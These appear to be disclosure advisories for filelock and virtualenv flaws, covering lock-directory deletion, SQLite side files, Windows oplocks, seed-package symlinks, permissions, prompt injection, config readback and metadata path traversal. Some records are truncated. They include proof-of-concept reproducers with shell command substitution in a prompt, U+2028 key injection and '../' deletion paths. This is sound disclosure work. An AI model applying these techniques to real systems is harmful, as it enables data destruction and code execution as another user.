items.title: [filelock] filelock: ReadWriteLock on the hard-link route deletes any directory another user renames onto its .filelock-* link directory name
items.summary: ReadWriteLock and AsyncReadWriteLock (the SQLite-backed reader/writer lock) remove their private .filelock-* link directories with shutil.rmtree (a recursive delete) on a remembered path. They do not check that the path still names the directory they created. This happens on the hard-link route (a hard link is a second name for the same file). That route is every connection on macOS since 4.1.1 and any POSIX process without a usable /proc/self/fd (a Linux path that names the process's own open files), such as a chroot or container that does not mount /proc.Another local user who can rename entries in the directory that holds the lock database can rename one of the directories of the user running the lock (below: the lock user) onto the link directory's name, or onto a forged dead-holder name. Such a lock directory is a 0777 or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). The lock user's process then deletes that tree and everything in it with the lock user's permissions, and reports no error. Stock Linux with /proc mounted is not affected. Affected versions are filelock 4.1.0 through 4.2.0.Anthropic's OSS Scanner reported this in private as ANT-2026-LSSZIUEO [high, CWE-367]: ReadWriteLock deletes any directory another user renames to .filelock-*.SeverityCVSS 3.1 CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L scores 6.1 (Medium). AV:L (local): the other user needs an account on the same host. PR:L (low privileges): an ordinary account is enough. UI:N (no user interaction). AC:L (low attack complexity): two rename calls and no race against filelock's own code. I:H (high integrity impact): the other user destroys a directory tree owned by the lock user, and the lock user's program reports no error. A:L (partial availability loss): the Python 3.11 RecursionError variant makes the lock user's first lock construction fail. C:N (no confidentiality impact): the other user learns nothing. S:U (scope unchanged): the effect stays within the lock user's own privileges.Classification from the external review: conditional security, a cross-user rename in a non-sticky shared parent that turns private-link cleanup into recursive deletion of the lock user's tree. The scanner rated it high. The review accepts the mechanism, notes that the macOS route rests on a Linux run with /proc hidden rather than on a run on macOS, and narrows the finding to that precondition and route.Scope and preconditionsThe other party is a different local account with write permission on the directory that holds the lock database, where that directory has no sticky bit. That is a 0777 directory, or a group-writable one (in a setgid 2775 directory a group member can rename the lock user's sub-directory the same way). Renaming an entry needs write permission on the parent only, not on the entry. Anyone who can write the parent can rename a 0700 directory of the lock user.Sticky directories (/tmp itself, any 1777 directory) stop the release variant: the rename of an entry owned by the lock user fails with EPERM. The dead-owner sweep still reaches a lock user's tree that sits inside a directory the other account owns there. That account may rename its own directory to a forged dead-owner name, and the lock user's sweep deletes everything inside it. The Python 3.11 RecursionError variant also works in a sticky directory.Platform and route. The lock user must connect through the private hard link. That is every ReadWriteLock or AsyncReadWriteLock on macOS (since 4.1.1, #820), or a POSIX process whose /proc/self/fd/<n> (/dev/fd/<n> elsewhere) does not exist, such as a chroot or container without /proc. Linux with /proc mounted connects through the descriptor and creates no .filelock-* directory (checked: none appears, also with two holders in one process), so stock Linux is not affected at 4.2.0. The macOS statement rests on the descriptor_usable branch at line 984 and docs/how-to.rst. The reproducer runs the same Python code on Linux with /proc hidden, which takes root and is test scaffolding, not a step the other user performs. Windows does not take this route.Target set. Only directories that sit in the shared parent itself, or that the other account can already write, are reachable. The kernel refuses to move a 0700 directory of the lock user in from another parent. A tree the other account can already write (a group-writable project tree created with umask 002) is no gain, since that account can delete it without filelock. A lock user running as root deletes a tree of any owner.Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. items.title: [filelock] filelock: ReadWriteLock on Windows acts on SQLite side files another local user places beside its database
items.summary: On Windows, ReadWriteLock and AsyncReadWriteLock (the SQLite-backed reader/writer lock) connect SQLite to the lock database by its path, in every directory. SQLite derives three side files from that path: <database>-journal, the rollback journal (pages saved to undo an interrupted write); <database>-wal, the write-ahead log (changes kept outside the main file); and <database>-shm, the shared-memory index of the WAL. SQLite acts on whichever of these it finds beside the database before the lock runs any statement. Another local account that can create files in the database's directory, but not delete files of other accounts there, places such a side file beside the database and denies everyone DELETE on it, which a file's creator may do. C:\Windows\Temp (the temporary directory of services, granting BUILTIN\Users create but not delete) and C:\Users\Public are such directories.With a -wal in place, every read_lock() and write_lock() of the user running the lock (below: the lock user) raises sqlite3.OperationalError: disk I/O error at once, whatever timeout says, until that account removes its file; the lock user cannot. With a -journal beside a lock database that holds a table, SQLite replays the journal and deletes the file the journal names, a file of the lock user, and the acquire reports success. Affected versions are filelock 3.20.4 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the POSIX form of the defect, GHSA-v4x8-3wr5-3wq8, whose text says "Windows does not take this path" (review round 4, finding F2 of set D). It is not among the findings of the report Anthropic's OSS Scanner sent on 15 October 2026.SeverityCVSS 3.1 CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L scores 3.3 (Low).AV:L (local): the other account needs a logon on the same host. AC:L (low attack complexity): create one file beside the database and set its ACL (access control list); no race, and the other account can place the file days earlier. PR:L (low privileges): an ordinary account that can create files in the directory is enough. UI:N (no user interaction). S:U (scope unchanged). C:N (no confidentiality impact): the other account learns nothing. I:N (no integrity impact in the scored variant): see the scoring note. A:L (partial availability impact): every acquire fails with an exception that Timeout handlers do not catch, until the other account removes its file; no crash, and the lock's own data is not changed.Scoring note. The deletion variant reads CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L (3.6): I:L because the lock user's process deletes one file the journal names, AC:H because it needs a lock database that holds a table, which filelock does not create, and a journal the lock user can open for writing. The lower-reading rule of this advisory set scores the variant that reaches every ReadWriteLock on Windows in such a directory, 3.3, and describes the deletion variant under Mechanism. Classification from the review: security (another account), availability for the scored variant.Scope and preconditionsPlatform and classes: Windows only. ReadWriteLock and AsyncReadWriteLock, both of which connect through _connect. On Linux and macOS the lock takes other routes, covered by GHSA-v4x8-3wr5-3wq8.Directory: one where another account can create files but cannot delete the lock user's. C:\Windows\Temp carries BUILTIN\Users:(CI)(S,WD,AD,X) (create file and create subdirectory, no delete child); C:\Users\Public and any directory with such an entry qualify. A directory only the lock user can write, such as %LOCALAPPDATA% or the per-user temporary directory, is not affected.The other account creates <database>-wal, grants everyone modify and denies everyone DELETE on it. A file's creator may set both. The lock user can open and read the file but not delete it.Deletion variant: the lock database holds at least one table (filelock creates an empty database, and the review's reproducer has the lock account create the table), and the other account's <database>-journal grants the lock account modify rights. The journal's tail names a file the lock user can delete.What the lock user sees: write_lock(timeout=1) raised sqlite3.OperationalError: disk I/O error with the undeletable -wal in place; with the writable journal the acquire succeeded and the named file was gone; with an undeletable journal every acquire raised sqlite3.OperationalError: unable to open database file.The documentation at the scanned commit states "the lock directory must not be writable by untrusted users" for WindowsFileLock, in its symlink paragraph; the ReadWriteLock documentation names no directory requirement on Windows.Affected codeScanned commit b831496b0273: the Windows branch of _connect checks the database through a handle and then calls sqlite3.connect(database, ...) with the path. _open_lock_database and _raise_if_wal inspect that handle, not the side files. The first statement is PRAGMA busy_timeout=...; PRAGMA journal_mode=ME

items.title: [filelock] filelock: On Windows an oplock on a soft lock's marker holds SoftFileLock.acquire() past its timeout and blocks the stale break
items.summary: On Windows the soft locks (SoftFileLock, MarkerSoftFileLock, SoftFileLease, their async forms, and a FileLock that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each acquire() attempt that finds a marker opens it with os.open to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every acquire() by the user running the lock (below: the lock user) then waits inside the open, past its timeout, blocking=False and cancel_check, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.SeverityCVSS 3.1 CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L scores 2.5 (Low).AV:L (local): the other account needs a logon on the same host. AC:H (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its lifetime. PR:L (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). UI:N (no user interaction). S:U (scope unchanged). C:N and I:N: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. A:L (partial availability impact): one thread, or the event loop with run_in_executor=False, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.Classification from the review: security, conditional on an unheld marker that another account can open.Scope and preconditionsPlatform and classes: Windows only. SoftFileLock, MarkerSoftFileLock, SoftFileLease, AsyncSoftFileLock and the other async soft locks, and FileLock after its ENOSYS fallback to a soft lock. WindowsFileLock opens its lock file on a separate code path that this advisory does not cover.Marker access: the soft locks create the marker with os.open, which on Windows applies no more of mode than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose lifetime has passed. While the holder keeps its handle, the request fails.Holder behavior: the other account requests the oplock through an overlapped DeviceIoControl and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.What the lock user sees: SoftFileLock.acquire(timeout=1) returned Timeout after 10.02 s with the second account's handle. In the same-account probe os.open with O_RDONLY was still running after 15 s and returned once the holder closed. The retry loop consults timeout, blocking=False and cancel_check between attempts only. With AsyncSoftFileLock(run_in_executor=False) the event loop waits.Stale break: break_lock_file renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.Affected codeScanned commit b831496b0273: the os.open in _read_lock_file (function), called from _try_break_stale_lock on every attempt that finds a marker, and from _unprobeable_holder, pid and is_lock_held_by_us. break_lock_file renames at L116 and unlinks at L118 and L122, by path. _poll_until_acquired and _check_give_up test the deadline, blocking and cancel_check only between attempts.Introducede35c3af "feat(soft): detect and break stale locks" (#476, 2026-02-13), first tag 3.22.0 (verified with git tag --contains). items.title: [virtualenv] virtualenv: Temporary app-data can leave dangling seed package links
items.summary: SummaryThe app-data seeder can leave an environment linked to temporary package files that virtualenv deletes when creationfinishes. The environment-variable and configuration-file forms of symlink_app_data can enable this state even thoughthe command-line flag is disabled for temporary app-data. The resulting environment depends on a cache pathname that itsowner no longer controls.Anthropic's OSS Scanner reported this as ANT-2026-ZOE2GEPC in virtualenv-20261015-005, received on 15 October 2026.This draft records source review and functional remediation checks. The reporter's cross-account code-execution claimhas not been independently reproduced.Affected areaIntegrity of app-data references after temporary cache cleanup.Attacker-controlled inputSymlink seeding must be enabled through VIRTUALENV_SYMLINK_APP_DATA or symlink_app_data in the configuration file,and app-data setup must fall back to a temporary directory. A missing or unwritable configured cache can cause thatfallback. Ordinary copy seeding does not leave these references.The security concern requires a shared temporary-directory parent where another account can acquire the deleted cachepathname, followed by use of the affected environment. That account need not already be able to modify the environmentor the private cache while it exists. This differs from the security policy's excluded case of an account that alreadycontrols live app-data contents. On a platform with a temporary-directory parent private to the environment owner, thatcross-account condition is absent. Windows functional checks do not establish cross-account exposure under Windowsdefaults.Affected codeThe relevant 21.14.8 source is insymlink seeder,temporary cache cleanup.MechanismWhen app-data setup falls back to a temporary directory, the command-line --symlink-app-data action is disabled. Avalue supplied by VIRTUALENV_SYMLINK_APP_DATA or virtualenv.ini can still become the parser default, and the seederconstructor accepts that value without rechecking the cache lifetime. It links site-packages/pip into the temporarycache. Session cleanup deletes that cache, leaving a dangling link whose pathname can later be claimed by anotheraccount on a shared temporary filesystem.Reproduction and evidenceThe scanner ran its reproduction as two unprivileged users, with root used only to switch identities. The environmentowner had an unwritable home, so app-data fell back to /tmp. The control used the command-line flag and received areal pip directory. With VIRTUALENV_SYMLINK_APP_DATA=1, the new environment instead contained a pip link into adeleted /tmp/tmpXXXXXXXX directory. A second uid recreated the target path and placed a fake pip/__init__.py there.When the owner ran venv/bin/pip --version, that module created a marker inside the owner's environment and printedthis is not pip.The cross-account path requires a shared temporary parent, a second account able to claim the deleted name, and lateruse of the environment. A private temporary parent removes that route. The report traces the incomplete temporary-cacheguard to #1661, first released in 20.0.6.Public fix PR #3437 copies packages whenever app-data istemporary, whatever supplied the symlink option. The implementation review checked the remediation; it did not rerun thecross-account reproduction.Attack sequencesequenceDiagram    participant U as Environment owner    participant V as virtualenv seeder    participant T as Temporary app-data in /tmp    participant E as site-packages/pip link    participant A as Other local account    U->>V: VIRTUALENV_SYMLINK_APP_DATA=1 with unwritable home    V->>T: create transient cache    V->>E: link pip to cache path    V->>T: delete cache at session exit    A->>T: reclaim old name and plant fake pip    U->>E: run bin/pip --version    E->>T: import fake pip through stale link    T-->>U: attacker's code runs as ownerReproducer filesThe following files are from the scanner report for ANT-2026-ZOE2GEPC. items.summary: SummaryThe pip seeder acquires bundled wheels with download=False and lets pip access the index when --download is selected.Index candidates on that path do not pass through virtualenv's wheel digest verification.Anthropic's OSS Scanner reported this as ANT-2026-74ALJBUF in virtualenv-20261015-005, received on 15 October 2026.Affected areaWheel selection by the pip seeder when downloads are enabled.Attacker-controlled inputThe pip seeder and download option must be selected. The finding concerns the default-index digest-verification policy.Explicit custom-index settings already opt out of comparison against PyPI metadata; this patch retains that policy.Affected codeThe relevant 21.14.8 source is inpip seeder.MechanismWith --seeder pip --download, PipInvoke.get_pip_install_cmd() first calls get_wheel(download=False), sovirtualenv's download_wheel() and verify_wheel_digest() are skipped. It then lets pip install consult theconfigured index. An index wheel with the same package and version as the bundled wheel can be selected withoutvirtualenv comparing its SHA-256 with PyPI metadata. The default app-data seeder takes the verification path for thesame option.Reproduction and evidenceThe scanner built a local index named in pip.conf that served a modified copy of the bundled pip wheel under the samefilename. In the control run, virtualenv --download env-default rejected the wheel with a digest mismatch. In thesecond run, adding --seeder pip produced an environment whose installed pip/__init__.py matched the index wheel;env-pip/bin/pip --version ran the added line. The reproducer checked the installed bytes and marker before reportingBUG.Both --seeder pip and --download are needed. The report used a non-PyPI index from pip.conf and leftPIP_INDEX_URL, PIP_EXTRA_INDEX_URL, and PIP_INDEX unset, so virtualenv's default-seeder PyPI comparison remainedactive. This does not establish index control in the default PyPI setup. The unchecked pip-seeder download path isolder, while the comparison with the default seeder arose when digest verification was added in 21.7.12.PR #3430 acquires and verifies selected wheels before invoking pip withindex lookup disabled.Attack sequencesequenceDiagram    participant I as Index in pip.conf    participant V as virtualenv PipInvoke    participant P as pip install    participant E as Seeded environment    I->>V: serve modified pip wheel    V->>V: get_wheel(download=False)    V->>P: install with --download permitting index lookup    P->>I: select same-version index wheel    I->>E: modified pip installed without virtualenv digest check    E->>E: later pip invocation runs added code    Note over V,E: Default app-data seeder rejects the same digestReproducer filesThe following files are from the scanner report for ANT-2026-74ALJBUF. items.title: [virtualenv] virtualenv: Downloaded wheel selection and caching precede verification
items.summary: SummaryWheel downloads go directly into the reusable wheelhouse, while the verification target is selected from pip's textualoutput. A verification failure does not remove the downloaded file from that cache.Anthropic's OSS Scanner reported this as ANT-2026-ST00DRO3 in virtualenv-20261015-005, received on 15 October 2026.Affected areaDownload selection and promotion into the reusable wheel cache.Attacker-controlled inputA download must fail verification, or the archive selected from pip output must differ from the file later reused.Default-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPIcomparison.Affected codeThe relevant 21.14.8 source is inwheel download and digest check.Mechanismdownload_wheel() tells pip to write directly into the reusable wheel/house cache. It then selects a path to hashfrom the first Saved  line in pip's stdout, rather than from the file pip actually placed there. A package index caninject such a line through a discarded link's data-requires-python attribute. A separate failure exists without theforged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remainthere. Later wheel selection does not hash the cached file again.Reproduction and evidenceThe scanner used a local index configured in pip.conf, with PyPI digest comparison still enabled. In the control caseit served a modified pip wheel alone. virtualenv --upgrade-embed-wheels refused the mismatch, and a subsequentenvironment used the bundled pip. In the attack case the index added a link whose data-requires-python contained aforged Saved <path> line pointing at a genuine bundled wheel. The upgrade then exited without a digest error, recordedthe modified wheel in its update log, and a later environment's pip --version ran a line added by the index. Thereproduction used a known absolute path to the genuine bundled wheel; that prerequisite is part of this variant.The report also shows that a refused wheel can replace a previously accepted file of the same name in wheel/house,leaving rejected bytes available for later use. It does not claim to bypass TLS or affect the default PyPI setup. items.title: [virtualenv] virtualenv: Xonsh activation literals depend on the script decoding codec
items.summary: SummaryCaller-supplied prompt text can become executable syntax in the xonsh activation script. An attacker must influence thevalue passed to virtualenv, and a user must subsequently activate the environment.Affected areaXonsh reads a UTF-8 activation script using a legacy multibyte encoding such as GBK. Printable non-ASCII bytes canchange how the reader recognizes an adjacent quote. The report concerns POSIX activation. It does not establish exposurethrough unrelated activators.Attacker-controlled inputThe attacker controls prompt or destination data passed as a virtualenv argument. items.title: [virtualenv] virtualenv: Seeded files retain permissions from an older cache
items.summary: SummaryThe app-data copy seeder uses shutil.copy, which preserves cached file modes independently of the current umask. A cachepopulated under permissive permissions can therefore produce files with wider access in later environments.Anthropic's OSS Scanner reported this as ANT-2026-487MH6OW in virtualenv-20261015-005, received on 15 October 2026.Affected areaPermissions of files copied from app-data into a new environment.Attacker-controlled inputThe cache must contain files created with broader permissions than the current environment creator intends. Anotheraccount must also be able to traverse the new environment and reach those files. A private parent directory preventsthat access. No control of a private live cache is assumed.Affected codeThe relevant 21.14.8 source is incopy helpers.MechanismThe default app-data seeder extracts a wheel into a reusable cache and copies its files into later environments withshutil.copy(). That function applies the cached source mode to each destination file after creating it, overriding thecurrent run's umask. If the cache image was built under umask 000, a later environment created under umask 022 canreceive mode-0666 pip files. The cache may be private while the new environment is reachable by other local accounts.Reproduction and evidenceThe scanner created two histories with separate private app-data caches. In the control, the owner's first run usedumask 022; a later environment had no files writable by another account, and that account could not append topip/__init__.py. In the attack history, the first run used umask 000 and the later run still used 022. The reportcounted 478 of 493 environment files writable by others. A second unprivileged uid appended a line to pip, andbin/pip --version ran it as the environment owner. The cache itself remained under a mode-0700 home in bothhistories.An attacker cannot force the owner's earlier umask through this finding; the attack also needs a traversabledestination. A mode-002 cache can expose group write access under suitable group permissions. The scanner datesapp-data copy seeding to #1578, first released in 20.0.2. PR #3425creates copied files under a fixed non-writable-by-others policy further restricted by the current umask.Attack sequencesequenceDiagram    participant U as Environment owner    participant C as Private app-data cache    participant E as Later environment    participant A as Other local account    U->>C: first seed extraction under umask 000    C-->>U: cached pip files have mode 0666    U->>E: create environment under umask 022    C->>E: shutil.copy reapplies mode 0666    A->>E: append code to pip/__init__.py    U->>E: run bin/pip --version    E-->>U: appended code runs as ownerReproducer filesThe following files are from the scanner report for ANT-2026-487MH6OW. They were tested against commit a857a7823c73in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDsneed a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These filesare included as evidence and were not rerun for this advisory update.repro#!/usr/bin/env python3import globimport osimport shutilimport statimport subprocessimport sysfrom pathlib import Pathsys.stdout.reconfigure(line_buffering=True)  # keep these lines in order with those of the child processesos.umask(0o022)  # for the directories made here as rootOWNER, OTHER_USER = 1000, 65534  # root is only needed to switch to these two unprivileged uidsVIRTUALENV = ["virtualenv", "--quiet", "--no-periodic-update"]  # default seeder; no network for the update check# read here, as root: /tmp/repro.d need not be readable by the other userATTACK = Path("/tmp/repro.d/other_user_appends_to_pip.py").read_text()def run_as_owner(command, home, umask):    environ = {"HOME": str(home), "PATH": os.environ["PATH"]}    subprocess.run(command, user=OWNER, group=OWNER, extra_groups=[], umask=umask, env=environ, cwd=home, check=True)def mode(path):    return stat.filemode(os.stat(path).st_mode)work = Path("/tmp/seed-mode-repro")shutil.rmtree(work, ignore_errors=True)work.mkdir()proofs = work / "proofs"proofs.mkdir()proofs.chmod(0o777)  # the other user's line writes the uid it runs as in herewritable_by_others, appended_line_ran_as = {}, {}# the two histories differ only in the umask of the owner's earlier run, the one that fills ~/.cache/virtualenvfor case, umask_of_earlier_run in [("CONTROL", 0o022), ("OBSERVED", 0o000)]:    # set up: the owner's home, and with it the cache, is private; the project folder is reachable by path    home = work / f"{case}-home"    home.mkdir(mode=0o700)    os.chown(home, OWNER, OWNER)    projects = work / f"{case}-projects"    projects.mkdir(mode=0o755)    os.chown(projects, OWNER, OWNER)    # owner, some time ago: the first run, with an empty cache, extracts the pip wheel into it    run_as_owner([*VIRTUALENV, str(home / "earlier-env")], home, umask=umask_of_earlier_ru

items.title: [virtualenv] virtualenv: Bash prompt values can change meaning under older compatibility modes
items.summary: SummaryCaller-supplied prompt text can become executable syntax in the bash activation prompt. An attacker must influence thevalue passed to virtualenv, and a user must subsequently activate the environment and draw the prompt.Affected areaBash runs with compatibility level 4.2 and draws the environment prompt. Its replacement-string behavior differs fromnewer compatibility modes, leaving prompt text subject to a second interpretation. The report concerns POSIX activation.It does not establish exposure through unrelated activators.Attacker-controlled inputThe attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generatedactivation script.Affected codeThe relevant 21.14.8 source is inbash prompt assembly.Mechanismbin/activate copies the prompt into PS1. A shell expands PS1 again when it draws a prompt, so the value mustsurvive both the assignment and that later expansion. The bash and zsh branches escape for their usual prompt rules.Three other paths still interpret prompt data as commands: dash sourcing activate directly, a child dash inheriting anexported PS1 from bash, and bash running at compatibility level 4.2 or lower. A value such as x$(touch MARKER)y thenruns touch on prompt display. Creating the environment does not run the payload.Reproduction and evidenceThe scanner's child-shell reproducer creates an environment with --prompt 'x$(touch MARKER)y', sources bin/activatein interactive bash, and starts interactive sh (dash). Its control leaves PS1 unexported: neither shell createsMARKER. With PS1 exported, bash displays the prompt without executing the value, but the child dash createsMARKER; the reproducer ends in BUG. The report gives separate console reproductions for direct dash activation andbash compatibility level 4.2. The child-shell path can arise after another environment's activation has exported PS1.The scanner linked this finding to #3326 and its follow-up #3390. Thosechanges cover the usual bash path but leave the three paths above. The proposed change in#3418 keeps a variable reference in PS1, so prompt text is expanded asdata when drawn. The private report's reproducer was run by the scanner; the later command-execution result was suppliedby the maintainer review. This advisory does not claim that every POSIX shell or every bash mode is affected.IntroducedThe report traces direct dash sourcing to the first 20.x activator (20.0.0b1), and inherited PS1 to #3390 (firstreleased in 21.14.7). It demonstrates the compatibility-level case on bash 5.2. Those historical boundaries come fromthe report; the release confirmed by the maintainer is 21.14.8.Attack sequencesequenceDiagram    participant A as Prompt supplier    participant V as virtualenv    participant B as Interactive bash    participant D as Child dash    A->>V: --prompt x$(touch MARKER)y    V->>B: generated bin/activate    B->>B: assign escaped prompt to PS1    alt PS1 is not exported        B->>D: start sh with its own PS1        D-->>B: marker absent    else PS1 is exported        B->>D: start sh with inherited PS1        D->>D: expand $(touch MARKER) on prompt draw        D-->>B: marker created    endReproducer filesThe following files are from the scanner report for ANT-2026-1MOI2X3T. They were tested against commit a857a7823c73in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDsneed a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These filesare included as evidence and were not rerun for this advisory update.repro#!/usr/bin/env python3import shutilimport subprocessfrom pathlib import Pathwork = Path("/tmp/repro-inherited-ps1")shutil.rmtree(work, ignore_errors=True)work.mkdir()marker = work / "MARKER"print("sh is", Path("/bin/sh").resolve())# attacker: only the text a tool such as tox or hatch relays as --prompthostile_prompt = f"x$(touch {marker})y"# set up: the environment, made with the virtualenv commandsubprocess.run(    ["virtualenv", "--no-periodic-update", "--without-pip", "--activators", "bash",     "--prompt", hostile_prompt, str(work / "env")],    check=True, stdout=subprocess.DEVNULL,)assert not marker.exists(), "creating the environment must not run the prompt"# user: in an interactive bash, source bin/activate, then start sh.# -i makes both shells draw their prompt although stdin is not a terminal; sh draws one, reads EOF and returnssession = Path("/tmp/repro.d/user_session.sh").read_text()interactive_bash = ["bash", "--norc", "--noprofile", "-i"]# control: PS1 set in bash but not exported, so sh does not inherit itcontrol = subprocess.run(interactive_bash, input="PS1='\\$ '\n" + session,                         stderr=subprocess.PIPE, text=True, check=True)print(control.stderr)ran_in_control = marker.exists()print("CONTROL  PS1 not exported: marker created:", ran_in_control)# attack: the same session with the one difference that PS1 is exportedattack =

items.title: [virtualenv] virtualenv: Venv configuration readback can reinterpret path boundaries
items.summary: SummaryThe venv creator reads the standard library's generated pyvenv.cfg with splitlines() and merges all resulting keys overvirtualenv's configuration. Line-boundary characters from destination data can therefore become configuration structurebefore output sanitization.Anthropic's OSS Scanner reported this as ANT-2026-6ZQHJ6VI in virtualenv-20261015-005, received on 15 October 2026.Affected areaConfiguration readback by the stdlib venv creator.Attacker-controlled inputAn untrusted caller must influence the destination pathname passed to the venv creator. That pathname must contain acharacter that Python treats as a line boundary. The builtin creator follows a different configuration-writing path.Affected codeThe relevant 21.14.8 source is invenv readback,configuration parser.MechanismWith --creator venv, virtualenv asks the standard library to create an environment, reads its pyvenv.cfg withstr.splitlines(), and merges the parsed keys over virtualenv's chosen settings. CPython writes the destination into acommand = value without escaping every character that splitlines() recognizes as a line boundary. A destinationcontaining U+2028, for example, can therefore supply new home and include-system-site-packages keys during readback.Virtualenv writes those keys as real configuration lines. The builtin creator does not use this readback path.Reproduction and evidenceThe scanner used one destination value with U+2028 between home = /attacker/chosen,include-system-site-packages = true, and an absorbing x = key. A python -m venv --without-pip control kept thevalue inside its command line and reported the base interpreter's sys._home. virtualenv --creator venv --no-seedon the same value wrote separate injected configuration lines and its interpreter reportedsys._home = /attacker/chosen. The path did not require a literal newline byte. The control establishes that the extrakeys came from virtualenv's readback, not from the standard library's initial file alone.The altered home can change which standard-library files the interpreter loads if an attacker also controls thatlocation; include-system-site-packages = true weakens environment isolation. Choosing the venv creator is required,either explicitly or through a rare fallback. The report traces the readback to the 20.x rewrite, first released in20.0.0b1. PR #3426 rejects line-boundary characters before creation andrebuilds the final configuration from selected settings.Attack sequencesequenceDiagram    participant A as Destination supplier    participant S as stdlib venv    participant V as virtualenv readback    participant C as Final pyvenv.cfg    participant P as Environment Python    A->>S: path contains U+2028 and home = /attacker/chosen    S->>C: write path inside command value    V->>C: read with splitlines()    V->>V: parse suffix as separate keys    V->>C: rewrite home and include-system-site-packages    P->>C: read injected keys on startup    C-->>P: sys._home changes and isolation is disabledReproducer filesThe following files are from the scanner report for ANT-2026-6ZQHJ6VI. They were tested against commit a857a7823c73in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDsneed a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These filesare included as evidence and were not rerun for this advisory update.repro#!/usr/bin/env python3import osimport shutilimport subprocesswork = "/tmp/repro-venv-creator-cfg"shutil.rmtree(work, ignore_errors=True)# the attacker's input: the text of a destination path.# U+2028 ends a line for str.splitlines() but not for CPython's own pyvenv.cfg reader.# The slashes only make nested directories; the last key, x, absorbs the rest of the path.LS = "\u2028"dest = f"{work}/proj{LS}home = /attacker/chosen{LS}include-system-site-packages = true{LS}x = /env"base_python = os.path.realpath(shutil.which("python"))real_home = os.path.dirname(base_python)def pyvenv_cfg_lines(env):    # split on "\n" only, as the interpreter does    return open(f"{env}/pyvenv.cfg", encoding="utf-8").read().split("\n")def sys_home(env):    # site.py sets sys._home from the `home` key of the environment's pyvenv.cfg    probe = [f"{env}/bin/python", "-c", "import sys; print(sys._home)"]    return subprocess.run(probe, capture_output=True, text=True, check=True).stdout.strip()# control: the same path through the standard library alonestdlib_env = dest + "-stdlib"subprocess.run([base_python, "-m", "venv", "--without-pip", stdlib_env], check=True)# attack: the same path through virtualenv; --creator venv is the one non-default optionvirtualenv_env = dest + "-virtualenv"created = subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--no-seed", "--creator", "venv", virtualenv_env])if created.returncode != 0:  # refusing such a destination is a valid fix    print("virtualenv refused the destination")    print("OK")    raise SystemExit# checkst

items.title: [virtualenv] virtualenv: Seed replacement does not contain metadata deletion paths
items.summary: SummaryThe app-data seeder joins paths from existing distribution metadata to site-packages and deletes the resulting pathswithout checking containment within the environment.Anthropic's OSS Scanner reported this as ANT-2026-SXOEHWP7 in virtualenv-20261015-005, received on 15 October 2026.Affected areaRemoval of a previously installed seed package.Attacker-controlled inputAn environment being reused must contain distribution metadata influenced by another account. The invoking user musthave deletion rights over the paths named by that metadata. Installing a new environment without existing packagemetadata does not enter this cleanup path.Affected codeThe relevant 21.14.8 source is inseed uninstall.MechanismBefore reinstalling a seed wheel, PipInstall._uninstall_previous_version() accepts an existing pip-*.dist-infodirectory in the destination. _uninstall_dist() reads its top_level.txt and RECORD, joins each entry tosite-packages, and deletes the result. It does not check whether .., an absolute entry, or a linked parent takes thepath outside the environment. The default app-data seeder reaches this path when it reuses a tree containingseed-package metadata; --clear removes that tree first.Reproduction and evidenceThe scanner prepared a project with .venv/lib/python3.14/site-packages/pip-1.0.dist-info/. Its top_level.txtcontained ../../../../../Documents; its RECORD named ../../../../../notes.txt,,. The user's home initially heldDocuments/thesis/chapter1.txt and notes.txt. Running virtualenv .venv exited successfully but removed both paths.A control tree with top_level.txt set to pip and a normal pip/__init__.py RECORD entry left the home files inplace. The reproducer prints BUG only when the control files survive and both attack targets disappear.The deletion uses the invoking user's permissions and runs during creation, before any use of the environment. Itrequires an existing destination that another account could populate; a fresh empty environment does not supply hostilemetadata. The report traces this cleanup to #2186, first released in 20.8.1.PR #3428 checks each deletion path against the resolved environment rootand refuses to delete the root itself.Attack sequencesequenceDiagram    participant A as Prepared .venv metadata    participant V as App-data seeder    participant P as site-packages    participant H as User home    A->>P: top_level.txt names ../../../../../Documents    A->>P: RECORD names ../../../../../notes.txt    V->>P: read 